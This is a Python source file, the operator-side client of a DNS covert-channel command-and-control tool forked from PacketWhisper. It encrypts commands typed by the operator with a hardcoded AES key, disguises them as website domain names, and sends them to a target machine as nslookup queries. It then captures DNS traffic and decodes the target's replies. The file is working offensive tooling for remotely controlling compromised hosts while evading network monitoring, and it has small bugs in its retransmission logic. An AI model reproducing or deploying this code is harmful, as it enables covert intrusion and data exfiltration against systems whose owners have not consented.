import subprocess
import os
import argparse
from decloakify import Decloakify
from aes_encrypt import decrypt_message, encrypt_message
from cloakify import Cloakify
from scapy.all import sniff, wrpcap
from packetWhisper import CloakAndTransferFile, ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries, TransferCloakedFile

# Chiave AES (16, 24 o 32 byte)
key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
cipher = "ciphers\\common_fqdn\\topWebsites"

def send_command(command, dns):
    # Criptare il comando
    encrypted_command = encrypt_message(command, key) #debug
    #print("Encrypted command: "+encrypted_command)
    # Genera e cloackifica il comando in `cloaked_command.txt`
    cloaked_command = "cloaked_command.txt"
    
    #print("Cloaking command...")
    Cloakify(encrypted_command, cipher, cloaked_command)

    #print("Initializing command transfer")
    TransferCloakedFile("cloaked_command.txt", 0.0, dns)
    # Verifica che il file `cloaked_command.txt` sia stato creato correttamente
    if not os.path.exists(cloaked_command):
        print("Errore: il file `cloaked_command.txt` non è stato creato.")
        return

    # Invia il comando tramite pacchetti DNS
    with open(cloaked_command, 'r') as file:
        for fqdn in file:
            fqdn_str = fqdn.strip()
            subprocess.call(['nslookup', fqdn_str], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Rimuove il file dopo l'invio per evitare invii ripetuti
    os.remove(cloaked_command)


def receive_response():
    #print("Capturing pcap...")
    subprocess.call(['python', 'pcapCapture.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) 
    #print("pcap collected...")
    dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_response.pcap", osStr="Windows")
    cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipher, "www", isRandomized=True )

    cloaked_response = cloakedFile #"cloaked.payload"
    
    decloaked_response = "decloaked_response.txt"
    
    with open(cloaked_response, 'r') as file:
        if file.read().strip() == "":
            print("No response received.")
            return
        
    # Decloakificare il comando
    #print("Decloakifying...")
    if Decloakify(cloaked_response, cipher, decloaked_response) == -1:
        print("Requesting re-trasmission")
        send_command('rt')
        receive_response()

    # Decrypt command
    with open(decloaked_response, 'r') as file:
        encrypted_response = file.read().strip()
    #print("encrypted_response: ", encrypted_response)
    response = decrypt_message(encrypted_response, key)
    print(f'\n {response}')
    if response=='rt':
        send_command(command)
    
        

    # Rimuove il file di comando dopo l'elaborazione
    os.remove(cloaked_response)
    os.remove(decloaked_response)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Please make sure receiver is running on target ip (-d) \r\n\nNote: if unspecified default DNS (target ip) is considered to be 'localhost'",
        formatter_class=argparse.RawTextHelpFormatter 
    )
    ascii_art = """
            I@Y                  ~$o                   o$             
          "o@@@@Bf^          ,x$@@@@@@#)`          IC@@@@@m           
        'h@@Wi>b@@@@@@Mo*$@@@@@@h-  (M@@@@@@BooW@@@@@@Q:|$@@J         
       m@@@}      ;z#@@@@@$b/`          ,na@@@@@@hf`      v@@@v       
     0@@@v                                                  b@@@[     
   t@@@Y   #@@@BJ,    <h@@@X.   @@_   j@M m@@@@@@@t @@@@@@    b@@$>   
 [B@@w     #@. i@@+ `$@Y` +M@C  @@_   f@M    p@Y    @@|        `#@@M, 
r@@$'      #@. i@@l W@j    ,@@< @@_   f@M    m@c    @@z_-<       [@@@+
 -@@k      #@@@@f   @@[     @@+ @@_   f@M    m@c    @@ammY       B@$  
  X@@C     #@. t@$  >@@-   m@h  w@w   k@x    m@c    @@{         o@@i  
   a@$.    #@.  /@W'  Z$@@@o]    r$@@@W[     m@c    @@@@@@~    l@@Q   
   j@@)                                                        b@@i   
   !@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    
   `@@#                                                       `@@o    
   ^@@*                                                       '@@*    
   >@@Z                                                        @@@    
   r@@}                                                        p@@<   
   b@$.                                                        i@@J   
  +@@k                                                          M@B   
  a@$                                                           /@@m  
 t@@Y                                                            d@@^ 
'@@B                                        <>                   >@@B 
1@@/               1@$CCw@@f  c@@@!  m@n ]@MxfOO                  m@@l
p@@I               1@#    o@( c@|$@< m@n Z@a                      ]@@t
$@@                1@#    X@d c@(.@@ m@n  (@@@o<                  !@@Y
B@@.               1@#    h@/ c@| "@@o@n     ;@@                  i@@X
0@@>               {@Wl>Q@@r  c@|  :@@@n bz;:X@*                  |@@1
i@@m               '///|-     >f^    |/   }rnf,                   B@@'
 Z@@X                                                            d@@- 
  k@@a                                                          M@@n  
   f@@@/                                                      Q@@$~   
     m@@@d;                                                _#@@$n     
       j@@@@@MdX)`                                  I/CkB@@@@B-       
          >O@@@@@@@@@B#w|                   `xbM$@@@@@@@@$c:          
                  -0oW@@@@@@@$c.      ;O@@@@@@@$Mozi                  
                         "(Q#@@@@@zw@@@@@hY]                          
                               i0@@@$v,                               
                                  x:     

    ~ Loris Simonetti a.k.a HeroS3c
    Forked from: PacketWhisper                             

    """
    
    print(ascii_art)

    parser.add_argument(
        '-d','--dns',
        type=str,
    )
    args = parser.parse_args()
    print("Type a command to hijack below:")
    subprocess.Popen(['python', 'dns_server.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    while True:
        if args.dns:
            dns = args.dns
        command = input("> ")
        send_command(command, dns)
        try:
            receive_response() 
        except Exception as e:
            print(f'Something wrong happend during the connection: {e}')
